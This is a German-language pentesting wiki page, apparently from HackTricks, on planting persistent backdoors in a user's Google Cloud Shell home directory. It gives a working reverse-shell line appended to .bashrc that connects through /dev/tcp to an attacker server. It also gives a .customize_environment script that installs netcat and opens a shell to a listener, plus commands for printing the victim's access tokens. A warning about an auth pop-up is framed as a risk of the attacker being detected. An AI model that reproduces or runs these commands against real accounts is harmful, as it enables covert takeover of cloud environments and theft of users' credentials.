# GCP - Cloud Shell Persistenz

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Für weitere Informationen siehe:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Persistente Backdoor

[**Google Cloud Shell**](https://cloud.google.com/shell/) bietet dir Zugriff auf die Kommandozeile deiner Cloud-Ressourcen direkt im Browser, ohne dass Kosten anfallen.

Du kannst auf Google Cloud Shell über die Web-Konsole oder durch Ausführen von **`gcloud cloud-shell ssh`** zugreifen.

Diese Konsole bietet Angreifern einige interessante Möglichkeiten:

1. **Jeder Google-Nutzer mit Zugriff auf Google Cloud** hat Zugriff auf eine vollständig authentifizierte Cloud Shell-Instanz (Service Accounts können das ebenfalls, sogar wenn sie Owners der Organisation sind).
2. Diese Instanz wird **ihr Home-Verzeichnis für mindestens 120 Tage** behalten, wenn keine Aktivität stattfindet.
3. Eine Organisation hat **keine Möglichkeit**, die Aktivität dieser Instanz zu überwachen.

Das bedeutet im Wesentlichen, dass ein Angreifer eine Backdoor im Home-Verzeichnis des Nutzers platzieren kann und solange der Nutzer mindestens alle 120days eine Verbindung zur GC Shell herstellt, die Backdoor erhalten bleibt und der Angreifer jedes Mal eine Shell erhält, wenn sie ausgeführt wird, einfach indem er:

<details>

<summary>Add reverse shell to .bashrc</summary>
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
</details>

Im Home-Verzeichnis gibt es eine weitere Datei namens **`.customize_environment`**, die, falls sie existiert, **bei jedem Zugriff** des Benutzers auf die cloud shell ausgeführt wird (wie bei der vorherigen Technik). Fügen Sie einfach die vorherige backdoor oder eine wie die folgende ein, um persistence aufrechtzuerhalten, solange der Benutzer die cloud shell "häufig" verwendet:

<details>

<summary>Backdoor in .customize_environment erstellen</summary>
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
</details>

> [!WARNING]
> Es ist wichtig zu beachten, dass beim **ersten Mal, wenn eine Aktion ausgeführt wird, die Authentifizierung erfordert**, ein Pop-up-Autorisierungsfenster im Browser des Benutzers erscheint. Dieses Fenster muss akzeptiert werden, bevor der Befehl ausgeführt werden kann. Wenn ein unerwartetes Pop-up erscheint, kann das Misstrauen erregen und die verwendete persistence method potenziell kompromittieren.

Dies ist das Pop-up, das beim Ausführen von `gcloud projects list` aus der Cloud Shell (als Angreifer) in der Browsersitzung des Benutzers angezeigt wird:

<figure><img src="../../../images/image (10).png" alt=""><figcaption></figcaption></figure>

Wenn der Benutzer die Cloud Shell jedoch aktiv genutzt hat, erscheint das Pop-up nicht und Sie können **tokens des Benutzers mit**:

<details>

<summary>Access tokens aus Cloud Shell abrufen</summary>
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
</details>

#### Wie die SSH-Verbindung hergestellt wird

Im Wesentlichen werden diese 3 API-Aufrufe verwendet:

- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (wird dich dazu bringen, deinen lokal erstellten public key hinzuzufügen)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (startet die instance)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (liefert dir die ip der google cloud shell)

Weitere Informationen findest du unter [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Quellen

- [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
- [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
- [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{{#include ../../../banners/hacktricks-training.md}}
